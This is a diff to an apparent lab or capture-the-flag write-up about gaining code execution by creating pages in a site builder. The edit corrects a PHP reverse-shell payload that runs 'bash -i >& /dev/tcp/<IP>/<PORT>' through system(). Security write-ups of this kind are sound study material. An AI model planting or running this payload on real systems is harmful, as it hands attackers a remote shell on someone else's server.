@@ -73,9 +73,9 @@ Turns out we can create a new site with the UI and create also different pages f
 
 <img src="imgs/testing-RCE.png" alt="Testing_RCE_2" width="80%" height="50%" class="center-60">
 
-So now just create a reverse shell payload
+So now we create a reverse shell payload
 ```php
-<?phP system("bash -c 'bash -i /dev/tcp/<IP>/<PORT> 0>&1'") ;?>
+<?phP system("bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'") ;?>
 ```
 <img src="imgs/reverse-shell-con-payload.png" alt="Reverse shell" width="100%" height="60%" class="center">
 
